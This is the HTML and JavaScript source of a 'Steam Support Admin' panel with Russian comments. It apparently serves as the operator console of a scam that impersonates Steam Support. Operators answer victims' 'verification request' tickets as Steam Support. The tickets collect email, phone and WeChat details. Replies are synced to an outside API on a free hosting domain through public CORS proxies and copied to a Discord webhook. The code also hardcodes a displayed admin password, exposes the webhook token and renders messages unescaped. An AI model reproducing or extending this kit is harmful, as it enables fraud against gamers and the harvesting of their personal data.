<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Steam Support Admin</title>
    <style>
        /* Все стили остаются такими же как в предыдущей версии */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: #0e141b; color: #c6d4df; min-height: 100vh; }
        
        .login-screen { display: flex; justify-content: center; align-items: center; height: 100vh; background: linear-gradient(135deg, #1b2838 0%, #171a21 100%); }
        .login-box { background: rgba(23, 26, 33, 0.95); padding: 40px; border-radius: 8px; border: 1px solid #2a475e; width: 400px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .login-box h2 { color: #66c0f4; margin-bottom: 30px; font-size: 24px; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .login-input { width: 100%; padding: 12px 15px; margin: 10px 0; background: rgba(0,0,0,0.3); border: 1px solid #2a475e; border-radius: 4px; color: white; font-size: 14px; }
        .login-btn { background: linear-gradient(180deg, #5c7e10 0%, #6fa720 100%); color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: bold; margin-top: 20px; width: 100%; }
        
        .admin-panel { display: none; height: 100vh; overflow: hidden; }
        .admin-header { background: linear-gradient(90deg, #171a21 0%, #1b2838 100%); padding: 15px 20px; border-bottom: 1px solid #2a475e; display: flex; justify-content: space-between; align-items: center; }
        
        .admin-main { display: flex; height: calc(100vh - 70px); }
        .sidebar { width: 250px; background: rgba(23,26,33,0.9); border-right: 1px solid #2a475e; padding: 20px; }
        .stats-card { background: rgba(42,71,94,0.3); padding: 15px; border-radius: 6px; margin-bottom: 20px; border: 1px solid #2a475e; }
        .stats-number { font-size: 28px; font-weight: bold; color: #76ffab; }
        
        .tickets-list { flex: 1; overflow-y: auto; padding: 20px; background: rgba(0,0,0,0.1); }
        .ticket-card { background: rgba(23,26,33,0.8); border: 1px solid #2a475e; border-radius: 6px; padding: 15px; margin-bottom: 15px; cursor: pointer; }
        .ticket-card:hover { border-color: #66c0f4; }
        .ticket-id { font-family: monospace; color: #66c0f4; font-weight: bold; }
        
        .chat-panel { width: 400px; background: rgba(23,26,33,0.9); border-left: 1px solid #2a475e; display: flex; flex-direction: column; }
        .chat-messages { flex: 1; overflow-y: auto; padding: 20px; }
        .message { margin-bottom: 15px; max-width: 85%; padding: 10px; border-radius: 6px; }
        .message-user { background: rgba(42,71,94,0.5); border-left: 3px solid #2a475e; margin-right: auto; }
        .message-admin { background: rgba(92,126,16,0.3); border-right: 3px solid #5c7e10; margin-left: auto; }
        
        .chat-input-area { padding: 15px; border-top: 1px solid #2a475e; }
        .chat-input { width: 100%; padding: 10px; background: rgba(0,0,0,0.3); border: 1px solid #2a475e; border-radius: 4px; color: white; font-size: 13px; resize: none; height: 80px; margin-bottom: 10px; }
        .send-btn { padding: 10px; background: #66c0f4; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
        
        .loading { text-align: center; padding: 40px; color: #8f98a0; }
        .spinner { border: 3px solid rgba(102,192,244,0.3); border-top: 3px solid #66c0f4; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .empty-state { text-align: center; padding: 60px 20px; color: #8f98a0; }
        .hidden { display: none !important; }
        .api-status { display: inline-flex; align-items: center; gap: 5px; font-size: 12px; padding: 3px 8px; border-radius: 3px; background: rgba(0,0,0,0.2); }
        .api-online { color: #76ffab; }
        .api-offline { color: #ff6b6b; }
        
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.1); }
        ::-webkit-scrollbar-thumb { background: #2a475e; border-radius: 4px; }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <!-- Login Screen -->
    <div id="loginScreen" class="login-screen">
        <div class="login-box">
            <h2><i class="fas fa-shield-alt"></i> Steam Support Admin</h2>
            <input type="password" id="adminPassword" class="login-input" placeholder="Enter admin password" autocomplete="off">
            <button onclick="login()" class="login-btn">Login to Admin Panel</button>
            <div style="margin-top: 20px; font-size: 12px; color: #8f98a0;">
                <p>Default password: <code>steamadmin2024</code></p>
                <p style="margin-top: 10px;">API: <code>http://elita313.beget.tech/api.php</code></p>
            </div>
        </div>
    </div>
    
    <!-- Admin Panel -->
    <div id="adminPanel" class="admin-panel">
        <!-- Header -->
        <div class="admin-header">
            <h2><i class="fas fa-tools"></i> Steam Support Tickets</h2>
            <div style="display: flex; align-items: center; gap: 15px;">
                <span class="api-status" id="apiStatus">
                    <i class="fas fa-circle"></i>
                    <span id="apiStatusText">Checking...</span>
                </span>
                <button onclick="logout()" style="background: #c34242; color: white; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-size: 13px;">
                    <i class="fas fa-sign-out-alt"></i> Logout
                </button>
            </div>
        </div>
        
        <!-- Main Content -->
        <div class="admin-main">
            <!-- Sidebar -->
            <div class="sidebar">
                <div class="stats-card">
                    <h3>Total Tickets</h3>
                    <div class="stats-number" id="totalTickets">0</div>
                </div>
                
                <div class="stats-card">
                    <h3>Pending</h3>
                    <div class="stats-number" id="pendingTickets">0</div>
                </div>
                
                <div class="stats-card">
                    <h3>Resolved</h3>
                    <div class="stats-number" id="resolvedTickets">0</div>
                </div>
                
                <div style="margin-top: 20px;">
                    <button onclick="loadTickets()" style="width: 100%; padding: 10px; background: #2a475e; color: white; border: none; border-radius: 4px; cursor: pointer;">
                        <i class="fas fa-sync-alt"></i> Refresh Tickets
                    </button>
                </div>
                
                <div style="margin-top: 20px; font-size: 12px; color: #8f98a0; padding: 10px; background: rgba(0,0,0,0.2); border-radius: 4px;">
                    <p><strong>Mode:</strong> <span id="modeText">Loading...</span></p>
                    <p style="margin-top: 5px; word-break: break-all;" id="apiInfo">API: Checking...</p>
                </div>
            </div>
            
            <!-- Tickets List -->
            <div class="tickets-list" id="ticketsList">
                <div class="loading" id="loadingTickets">
                    <div class="spinner"></div>
                    <p>Loading tickets...</p>
                </div>
            </div>
            
            <!-- Chat Panel -->
            <div class="chat-panel" id="chatPanel">
                <div class="chat-header" style="padding: 15px; border-bottom: 1px solid #2a475e; background: rgba(42,71,94,0.3);">
                    <h3 id="chatTitle">Select a ticket</h3>
                    <div style="font-size: 12px; color: #8f98a0; margin-top: 5px;">
                        <span id="chatTicketId">-</span>
                        <span style="margin-left: 10px;">Status: <span id="chatStatus">-</span></span>
                    </div>
                </div>
                
                <div class="chat-messages" id="chatMessages">
                    <div class="empty-state">
                        <i class="fas fa-comments"></i>
                        <p>Select a ticket to view conversation</p>
                    </div>
                </div>
                
                <div class="chat-input-area" id="chatInputArea" style="display: none;">
                    <textarea class="chat-input" id="messageInput" placeholder="Type response as Steam Support..."></textarea>
                    <div style="display: flex; gap: 10px;">
                        <select id="statusSelect" style="padding: 10px; background: rgba(0,0,0,0.3); border: 1px solid #2a475e; border-radius: 4px; color: white; min-width: 120px;">
                            <option value="pending">Pending</option>
                            <option value="reviewed">Reviewed</option>
                            <option value="resolved">Resolved</option>
                        </select>
                        <button class="send-btn" onclick="sendMessage()" style="flex: 1;">
                            <i class="fas fa-paper-plane"></i> Send Response
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Конфигурация - ТОЧНО ТАКАЯ ЖЕ КАК В INDEX.HTML
        const API_CONFIG = {
            mainApi: 'http://elita313.beget.tech/api.php',
            // Те же прокси что использует index.html
            proxyUrls: [
                'https://corsproxy.io/?',
                'https://api.allorigins.win/raw?url=',
                'https://proxy.cors.sh/',
                '' // Пустая строка для прямого запроса
            ],
            discordWebhook: 'https://discord.com/api/webhooks/1465641089146032221/rwlhhe7jcZArcETKrbODEsd7FbEc_02I4BoSG9pYsnlKusnGAA-X3MmfnZePitANlSAk'
        };
        
        const ADMIN_PASSWORD = 'steamadmin2024';
        
        // Состояние
        let tickets = [];
        let selectedTicketId = null;
        let currentApiStatus = false;
        let currentProxyIndex = 0;
        
        // Инициализация
        document.addEventListener('DOMContentLoaded', function() {
            // Проверка логина
            if (localStorage.getItem('steam_admin_logged_in') === 'true') {
                showAdminPanel();
            }
            
            // Проверка параметра в URL
            const urlParams = new URLSearchParams(window.location.search);
            const ticketId = urlParams.get('ticket');
            if (ticketId && localStorage.getItem('steam_admin_logged_in') === 'true') {
                setTimeout(() => selectTicket(ticketId), 1000);
            }
        });
        
        function login() {
            const password = document.getElementById('adminPassword').value;
            
            if (password === ADMIN_PASSWORD) {
                localStorage.setItem('steam_admin_logged_in', 'true');
                showAdminPanel();
            } else {
                alert('Incorrect password! Use: steamadmin2024');
            }
        }
        
        function logout() {
            localStorage.removeItem('steam_admin_logged_in');
            location.reload();
        }
        
        function showAdminPanel() {
            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('adminPanel').style.display = 'block';
            checkApiConnection();
            loadTickets();
        }
        
        // ТОЧНО ТАКОЙ ЖЕ МЕТОД КАК В INDEX.HTML
        async function checkApiConnection() {
            const statusElement = document.getElementById('apiStatus');
            const statusText = document.getElementById('apiStatusText');
            const modeText = document.getElementById('modeText');
            const apiInfo = document.getElementById('apiInfo');
            
            // Пробуем все прокси по очереди
            for (let i = 0; i < API_CONFIG.proxyUrls.length; i++) {
                try {
                    const proxy = API_CONFIG.proxyUrls[i];
                    const url = proxy + encodeURIComponent(API_CONFIG.mainApi + '?action=test');
                    
                    console.log(`Trying API connection via: ${proxy || 'direct'}`);
                    
                    const response = await fetch(url, {
                        method: 'GET',
                        headers: {
                            'Accept': 'application/json'
                        }
                    });
                    
                    if (response.ok) {
                        const data = await response.json();
                        if (data.success) {
                            currentApiStatus = true;
                            currentProxyIndex = i;
                            
                            statusText.textContent = 'API Online';
                            statusElement.className = 'api-status api-online';
                            
                            const proxyName = proxy.includes('corsproxy') ? 'CORS Proxy' : 
                                            proxy.includes('allorigins') ? 'AllOrigins' : 
                                            proxy.includes('proxy.cors') ? 'CORS.SH' : 
                                            'Direct';
                            
                            modeText.textContent = proxyName;
                            apiInfo.textContent = `API: Connected via ${proxyName}`;
                            
                            console.log(`API connected via ${proxyName}`);
                            return true;
                        }
                    }
                } catch (error) {
                    console.log(`Proxy ${i} failed:`, error);
                    continue;
                }
            }
            
            // Все прокси не работают - оффлайн режим
            currentApiStatus = false;
            statusText.textContent = 'Offline Mode';
            statusElement.className = 'api-status api-offline';
            modeText.textContent = 'Local Storage';
            apiInfo.textContent = 'API: Using local data only';
            
            console.log('All API connections failed, using offline mode');
            return false;
        }
        
        // Универсальный метод отправки запросов (как в index.html)
        async function apiRequest(action, data = null, ticketId = null) {
            const params = new URLSearchParams();
            params.append('action', action);
            if (ticketId) params.append('ticket_id', ticketId);
            
            const url = API_CONFIG.mainApi + '?' + params.toString();
            const proxy = API_CONFIG.proxyUrls[currentProxyIndex] || '';
            
            try {
                const requestUrl = proxy + encodeURIComponent(url);
                const options = {
                    method: data ? 'POST' : 'GET',
                    headers: {
                        'Accept': 'application/json',
                        'Content-Type': 'application/json'
                    }
                };
                
                if (data) {
                    options.body = JSON.stringify(data);
                }
                
                const response = await fetch(requestUrl, options);
                
                if (response.ok) {
                    return await response.json();
                }
            } catch (error) {
                console.log(`API request failed: ${action}`, error);
                throw error;
            }
            
            return null;
        }
        
        async function loadTickets() {
            const loadingElement = document.getElementById('loadingTickets');
            loadingElement.style.display = 'block';
            
            // Всегда загружаем из localStorage
            loadLocalTickets();
            
            // Пробуем загрузить с сервера если API доступен
            if (currentApiStatus) {
                try {
                    const serverData = await apiRequest('get_tickets');
                    if (serverData && serverData.success) {
                        mergeServerTickets(serverData.tickets || []);
                    }
                } catch (error) {
                    console.log('Failed to load from server, using local data');
                }
            }
            
            // Обновляем статистику и отображаем
            updateStats();
            renderTickets();
            
            loadingElement.style.display = 'none';
        }
        
        function loadLocalTickets() {
            const localTickets = JSON.parse(localStorage.getItem('steam_tickets') || '[]');
            
            if (localTickets.length === 0) {
                // Создаем демо данные если нет сохраненных
                tickets = [
                    {
                        id: 'S-' + Math.floor(1000000 + Math.random() * 9000000),
                        email: 'demo@example.com',
                        phone: '+1 234 567 8900',
                        wechat: 'Not provided',
                        created_at: new Date().toISOString(),
                        updated_at: new Date().toISOString(),
                        status: 'pending',
                        messages: [
                            {
                                sender: 'user',
                                message: 'Test verification request',
                                timestamp: new Date().toISOString()
                            },
                            {
                                sender: 'support',
                                message: 'Thank you for contacting Steam Support. We are reviewing your request.\n\nTravis',
                                timestamp: new Date().toISOString()
                            }
                        ]
                    }
                ];
                
                localStorage.setItem('steam_tickets', JSON.stringify(tickets));
            } else {
                tickets = localTickets;
            }
        }
        
        function mergeServerTickets(serverTickets) {
            serverTickets.forEach(serverTicket => {
                const existingIndex = tickets.findIndex(t => t.id === serverTicket.id);
                
                if (existingIndex === -1) {
                    // Новый тикет с сервера
                    tickets.push({
                        ...serverTicket,
                        source: 'server'
                    });
                } else {
                    // Обновляем существующий
                    tickets[existingIndex] = {
                        ...tickets[existingIndex],
                        ...serverTicket,
                        source: 'server',
                        messages: serverTicket.messages || tickets[existingIndex].messages
                    };
                }
            });
            
            // Сохраняем объединенные данные
            localStorage.setItem('steam_tickets', JSON.stringify(tickets));
        }
        
        function updateStats() {
            const total = tickets.length;
            const pending = tickets.filter(t => t.status === 'pending').length;
            const resolved = tickets.filter(t => t.status === 'resolved').length;
            
            document.getElementById('totalTickets').textContent = total;
            document.getElementById('pendingTickets').textContent = pending;
            document.getElementById('resolvedTickets').textContent = resolved;
        }
        
        function renderTickets() {
            const container = document.getElementById('ticketsList');
            const loadingElement = document.getElementById('loadingTickets');
            
            loadingElement.style.display = 'none';
            
            // Сортируем по дате (новые сверху)
            const sortedTickets = [...tickets].sort((a, b) => 
                new Date(b.updated_at) - new Date(a.updated_at)
            );
            
            container.innerHTML = '';
            
            if (sortedTickets.length === 0) {
                container.innerHTML = `
                    <div class="empty-state">
                        <i class="fas fa-inbox"></i>
                        <p>No tickets found</p>
                        <p style="font-size: 12px; margin-top: 10px;">Submit a verification request first</p>
                    </div>
                `;
                return;
            }
            
            sortedTickets.forEach(ticket => {
                const card = document.createElement('div');
                card.className = `ticket-card ${selectedTicketId === ticket.id ? 'selected' : ''}`;
                card.onclick = () => selectTicket(ticket.id);
                
                // Получаем последнее сообщение
                const lastMsg = ticket.messages && ticket.messages.length > 0 
                    ? ticket.messages[ticket.messages.length - 1] 
                    : null;
                
                const messagePreview = lastMsg 
                    ? (lastMsg.message.length > 60 
                        ? lastMsg.message.substring(0, 60) + '...' 
                        : lastMsg.message)
                    : 'No messages';
                
                const sender = lastMsg ? (lastMsg.sender === 'user' ? 'User: ' : 'Support: ') : '';
                
                // Форматируем дату
                const date = new Date(ticket.updated_at);
                const timeStr = date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
                const dateStr = date.toLocaleDateString();
                
                card.innerHTML = `
                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
                        <div class="ticket-id">${ticket.id}</div>
                        <div style="font-size: 11px; padding: 2px 6px; border-radius: 3px; background: ${getStatusColor(ticket.status)};">
                            ${ticket.status.toUpperCase()}
                        </div>
                    </div>
                    <div style="font-size: 13px; margin-bottom: 5px; color: #66c0f4;">
                        ${ticket.email}
                    </div>
                    <div style="font-size: 12px; color: #8f98a0; margin-bottom: 8px;">
                        ${dateStr} ${timeStr}
                    </div>
                    <div style="font-size: 12px; color: #c6d4df; font-style: italic;">
                        ${sender}${messagePreview}
                    </div>
                    ${ticket.source === 'server' ? 
                        '<div style="margin-top: 8px; font-size: 10px; color: #66c0f4;"><i class="fas fa-server"></i> From Server</div>' : 
                        ''}
                `;
                
                container.appendChild(card);
            });
        }
        
        function getStatusColor(status) {
            switch(status) {
                case 'pending': return 'rgba(255, 184, 32, 0.2)';
                case 'reviewed': return 'rgba(102, 192, 244, 0.2)';
                case 'resolved': return 'rgba(92, 126, 16, 0.2)';
                default: return 'rgba(42, 71, 94, 0.3)';
            }
        }
        
        function selectTicket(ticketId) {
            selectedTicketId = ticketId;
            
            // Сбрасываем выделение у всех
            document.querySelectorAll('.ticket-card').forEach(card => {
                card.classList.remove('selected');
            });
            
            // Выделяем выбранный
            const selectedCard = document.querySelector(`.ticket-card[onclick*="${ticketId}"]`);
            if (selectedCard) {
                selectedCard.classList.add('selected');
            }
            
            // Загружаем тикет
            const ticket = tickets.find(t => t.id === ticketId);
            if (ticket) {
                showChat(ticket);
            }
        }
        
        function showChat(ticket) {
            // Обновляем заголовок
            document.getElementById('chatTitle').textContent = ticket.email;
            document.getElementById('chatTicketId').textContent = ticket.id;
            document.getElementById('chatStatus').textContent = ticket.status;
            
            // Устанавливаем статус
            document.getElementById('statusSelect').value = ticket.status;
            
            // Показываем поле ввода
            document.getElementById('chatInputArea').style.display = 'block';
            
            // Показываем сообщения
            displayMessages(ticket.messages || []);
        }
        
        function displayMessages(messages) {
            const container = document.getElementById('chatMessages');
            
            if (!messages || messages.length === 0) {
                container.innerHTML = '<div class="empty-state"><i class="fas fa-comments"></i><p>No messages yet</p></div>';
                return;
            }
            
            container.innerHTML = '';
            
            messages.forEach(msg => {
                const messageDiv = document.createElement('div');
                
                if (msg.sender === 'system') {
                    messageDiv.innerHTML = `
                        <div style="text-align: center; padding: 5px; font-size: 11px; color: #8f98a0;">
                            ${msg.message}
                        </div>
                    `;
                } else {
                    const isUser = msg.sender === 'user';
                    messageDiv.className = `message ${isUser ? 'message-user' : 'message-admin'}`;
                    
                    const sender = isUser ? 'User' : 'Steam Support (You)';
                    const time = new Date(msg.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
                    
                    messageDiv.innerHTML = `
                        <div style="font-size: 11px; color: #8f98a0; margin-bottom: 3px;">
                            ${sender} • ${time}
                        </div>
                        <div style="white-space: pre-wrap; font-size: 13px;">${msg.message}</div>
                    `;
                }
                
                container.appendChild(messageDiv);
            });
            
            // Прокручиваем вниз
            setTimeout(() => {
                container.scrollTop = container.scrollHeight;
            }, 100);
        }
        
        async function sendMessage() {
            if (!selectedTicketId) {
                alert('Please select a ticket first');
                return;
            }
            
            const messageInput = document.getElementById('messageInput');
            const message = messageInput.value.trim();
            const newStatus = document.getElementById('statusSelect').value;
            
            if (!message) {
                alert('Please enter a message');
                return;
            }
            
            // Находим тикет
            const ticketIndex = tickets.findIndex(t => t.id === selectedTicketId);
            if (ticketIndex === -1) return;
            
            // Добавляем сообщение
            const newMessage = {
                sender: 'support',
                message: message,
                timestamp: new Date().toISOString()
            };
            
            tickets[ticketIndex].messages.push(newMessage);
            tickets[ticketIndex].status = newStatus;
            tickets[ticketIndex].updated_at = new Date().toISOString();
            
            // Сохраняем локально
            localStorage.setItem('steam_tickets', JSON.stringify(tickets));
            
            // Обновляем UI
            displayMessages(tickets[ticketIndex].messages);
            document.getElementById('chatStatus').textContent = newStatus;
            
            // Очищаем поле ввода
            messageInput.value = '';
            
            // Пытаемся отправить на сервер
            if (currentApiStatus) {
                try {
                    // Отправляем сообщение
                    await apiRequest('add_message', {
                        sender: 'support',
                        message: message
                    }, selectedTicketId);
                    
                    // Обновляем статус
                    await apiRequest('update_status', {
                        status: newStatus
                    }, selectedTicketId);
                    
                    console.log('Message sent to server successfully');
                    
                } catch (error) {
                    console.log('Failed to send to server, saved locally');
                }
            }
            
            // Отправляем Discord уведомление
            sendDiscordNotification(tickets[ticketIndex], message);
            
            // Обновляем список тикетов
            renderTickets();
            updateStats();
        }
        
        function sendDiscordNotification(ticket, message) {
            // Используем тот же вебхук что и index.html
            const webhookUrl = API_CONFIG.discordWebhook;
            
            const discordMessage = {
                content: `**📨 ADMIN RESPONSE**\n` +
                        `**Ticket:** ${ticket.id}\n` +
                        `**To:** ${ticket.email}\n` +
                        `**Status:** ${ticket.status}\n` +
                        `**Message:** ${message.substring(0, 150)}${message.length > 150 ? '...' : ''}\n` +
                        `**Time:** ${new Date().toLocaleString()}`
            };
            
            // Пытаемся отправить через прокси
            fetch('https://corsproxy.io/?' + encodeURIComponent(webhookUrl), {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(discordMessage)
            }).catch(() => {
                // Пробуем другой прокси
                fetch('https://api.allorigins.win/raw?url=' + encodeURIComponent(webhookUrl), {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(discordMessage)
                }).catch(() => {
                    console.log('Discord notification failed');
                });
            });
        }
        
        // Авто-обновление каждые 30 секунд
        setInterval(() => {
            if (localStorage.getItem('steam_admin_logged_in') === 'true') {
                checkApiConnection();
                loadTickets();
            }
        }, 30000);
        
        // Проверяем подключение при загрузке
        if (localStorage.getItem('steam_admin_logged_in') === 'true') {
            checkApiConnection().then(() => {
                console.log('Initial API check complete');
            });
        }
    </script>
</body>
</html>
